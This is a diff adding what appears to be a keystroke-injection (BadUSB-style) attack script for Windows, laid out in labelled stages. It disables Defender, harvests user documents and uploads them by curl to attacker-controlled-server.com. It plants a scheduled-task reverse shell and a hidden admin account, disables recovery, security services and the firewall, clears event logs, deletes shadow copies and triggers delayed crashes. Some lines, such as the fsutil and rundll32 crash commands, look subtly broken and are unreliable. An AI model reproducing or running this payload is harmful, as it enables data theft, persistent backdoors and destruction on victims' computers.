@@ -1,0 +1,99 @@
+// Stage 1: Initial Access & Privilege Escalation
+GuiR
+Delay 500
+Print powershell
+Press KEY_ENTER
+Delay 1000
+
+// Create working directory in an obscure location
+PrintLine mkdir C:\Windows\Temp\svc_logs
+Delay 500
+
+// Execute privilege escalation
+PrintLine powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -EncodedCommand' -Verb RunAs"
+Delay 1000
+Press KEY_LEFT_ALT
+Print y
+Release
+Delay 2000
+
+// Stage 2: Advanced Reconnaissance
+RunPowershellAdmin
+Delay 2000
+// Disable Windows Defender
+PrintLine Set-MpPreference -DisableRealtimeMonitoring $true
+Delay 1000
+// Create comprehensive system inventory
+PrintLine Get-ChildItem -Path "C:\Users\" -Recurse -Include *.doc,*.docx,*.xls,*.xlsx,*.pdf,*.txt,*.ppt,*.pptx,*.db,*.sql,*.bak -ErrorAction SilentlyContinue | Where-Object {$_.Length -lt 10MB} | Export-Csv C:\Windows\Temp\svc_logs\inventory.csv
+Delay 10000
+
+// Stage 3: Data Harvesting & Exfiltration
+// Copy high-value files
+PrintLine robocopy /S /MT:32 "C:\Users" "C:\Windows\Temp\svc_logs\data" *.doc *.docx *.xls *.xlsx *.pdf *.pst /XF *temp* *tmp* /MAX:10000000
+Delay 15000
+// Compress data for exfiltration
+PrintLine Compress-Archive -Path "C:\Windows\Temp\svc_logs\data" -DestinationPath "C:\Windows\Temp\svc_logs\package.zip" -Force
+Delay 8000
+
+// Upload to anonymous file sharing service using curl
+PrintLine curl -F "file=@C:\Windows\Temp\svc_logs\package.zip" https://attacker-controlled-server.com/upload.php
+Delay 10000
+
+// Stage 4: Backdoor Implantation
+// Create persistence via scheduled task
+PrintLine schtasks /create /tn "WindowsUpdate" /tr "powershell -WindowStyle hidden -e [BASE64_ENCODED_REVERSE_SHELL]" /sc daily /st 09:00 /ru SYSTEM /f
+Delay 1000
+// Add admin account with obfuscated name
+PrintLine net user /add SVC_Maintenance P@ssw0rd!Complex2023 /Y
+Delay 500
+PrintLine net localgroup administrators SVC_Maintenance /add
+Delay 500
+
+// Stage 5: Critical System Sabotage
+// Corrupt boot configuration
+PrintLine bcdedit /set {default} bootstatuspolicy ignoreallfailures
+Delay 500
+PrintLine bcdedit /set {default} recoveryenabled No
+Delay 500
+// Disable critical services
+PrintLine sc config wuauserv start= disabled
+Delay 300
+PrintLine sc config WinDefend start= disabled
+Delay 300
+PrintLine sc config wscsvc start= disabled
+Delay 300
+
+// Stage 6: Network Disruption
+// Change network configuration 
+PrintLine netsh advfirewall set allprofiles state off
+Delay 500
+PrintLine netsh interface ip set dns "Local Area Connection" static 10.0.0.1
+Delay 500
+
+// Stage 7: Anti-Forensics & Self-Destruction
+// Clear event logs
+PrintLine wevtutil cl System
+Delay 500
+PrintLine wevtutil cl Security
+Delay 500
+PrintLine wevtutil cl Application
+Delay 500
+
+// Delete Volume Shadow Copies
+PrintLine vssadmin delete shadows /all /quiet
+Delay 1000
+
+// Corrupt Master File Table and Registry with delayed execution
+PrintLine echo $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(30); $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"Get-WmiObject Win32_Shadow | ForEach-Object {$_.Delete()}; reg save HKLM\SAM C:\corrupted.reg; fsutil file createnew C:\corruptMFT.dat (10GB); shutdown /r /f /t 0`""; Register-ScheduledTask -TaskName 'SystemCleanup' -Trigger $trigger -Action $action -RunLevel Highest -Force
+Delay 2000
+
+// Delete attack artifacts
+PrintLine Remove-Item -Path "C:\Windows\Temp\svc_logs" -Recurse -Force
+Delay 2000
+
+// Final payload: Delayed BSOD trigger
+PrintLine powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 600; rundll32.exe ntstatus.dll,RtlSetProcessIsCritical 1,1,0"
+Delay 500
+
+// Exit cleanly to avoid immediate detection
+PrintLine exit
